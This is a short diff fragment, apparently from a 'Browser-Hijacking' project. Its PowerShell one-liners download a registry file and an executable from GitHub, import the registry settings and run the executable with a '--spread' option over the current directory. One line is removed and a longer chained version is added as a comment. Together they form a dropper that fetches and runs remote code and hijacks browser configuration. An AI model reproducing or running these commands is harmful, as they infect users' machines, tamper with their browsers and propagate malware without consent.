@@ -11,4 +11,4 @@ powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://r
 powershell -command "&{. $env:temp\\patcher.exe --spread (Get-Item .).FullName}"
 
 # Ultimate (testing)
-powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO', '$env:tmp/ieconf.reg'); }"
+# powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO', '$env:tmp/ieconf.reg'); (new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/blob/main/patcher_v67.exe?raw=true', '$env:temp/patcher.exe'); reg import $env:temp\\ieconf.reg;. $env:temp\\patcher.exe --spread (Get-Item .).FullName}"
